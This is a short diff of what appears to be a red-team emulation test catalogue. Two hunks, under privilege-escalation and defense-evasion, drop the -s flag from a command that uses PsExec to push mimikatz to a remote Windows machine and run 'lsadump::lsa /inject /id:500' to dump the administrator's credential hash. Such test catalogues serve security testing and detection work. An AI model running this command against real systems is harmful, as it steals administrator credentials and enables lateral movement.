@@ -6017,7 +6017,7 @@ privilege-escalation:
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
       executor:
-        command: '#{psexec_path} /accepteula \\#{machine} -s -c #{mimikatz_path} "lsadump::lsa
+        command: '#{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa
           /inject /id:500" "exit"
 
 '
@@ -37366,7 +37366,7 @@ defense-evasion:
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
       executor:
-        command: '#{psexec_path} /accepteula \\#{machine} -s -c #{mimikatz_path} "lsadump::lsa
+        command: '#{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa
           /inject /id:500" "exit"
 
 '
